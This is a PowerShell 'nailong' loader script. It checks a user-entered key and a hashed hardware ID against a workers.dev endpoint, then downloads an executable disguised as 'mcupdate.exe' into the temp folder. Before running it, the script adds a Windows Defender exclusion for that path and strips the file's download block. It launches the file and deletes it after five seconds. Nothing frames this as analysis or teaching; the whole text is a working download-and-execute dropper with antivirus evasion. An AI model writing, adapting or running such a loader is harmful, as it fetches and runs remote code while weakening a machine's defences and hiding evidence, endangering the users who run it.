# nailong loader -- key gated
 $worker = "https://nailong.cync911.workers.dev"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

try {
    Add-Type -AssemblyName Microsoft.VisualBasic
    $key = [Microsoft.VisualBasic.Interaction]::InputBox("enter your nailong key:", "nailong", "")
    if (-not $key) { exit }

    # hwid -- machine guid, hashed
    $uuid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $hash = [BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($uuid))).Replace("-","").ToLower()
    $hwid = $hash.Substring(0,32)

    # validate
    $resp = Invoke-RestMethod "$worker/check?key=$key&hwid=$hwid" -ErrorAction Stop

    if ($resp.status -ne "ok") {
        Add-Type -AssemblyName System.Windows.Forms
        $msg = switch ($resp.status) {
            "invalid_key"    { "invalid key." }
            "expired"        { "key expired. renew please." }
            "hwid_mismatch"  { "key is locked to another pc." }
            default          { "rejected: $($resp.status)" }
        }
        [System.Windows.Forms.MessageBox]::Show($msg, "nailong") | Out-Null
        exit
    }

    # download + run
    $dst = "$env:TEMP\mcupdate.exe"
    Add-MpPreference -ExclusionPath $dst -ErrorAction SilentlyContinue
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile("$worker/download?key=$key&hwid=$hwid", $dst)
    Unblock-File $dst -ErrorAction SilentlyContinue
    Start-Process $dst
    Start-Sleep 5
    Remove-Item $dst -Force -ErrorAction SilentlyContinue
} catch {
    Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
    [System.Windows.Forms.MessageBox]::Show("connection failed.", "nailong") | Out-Null
}
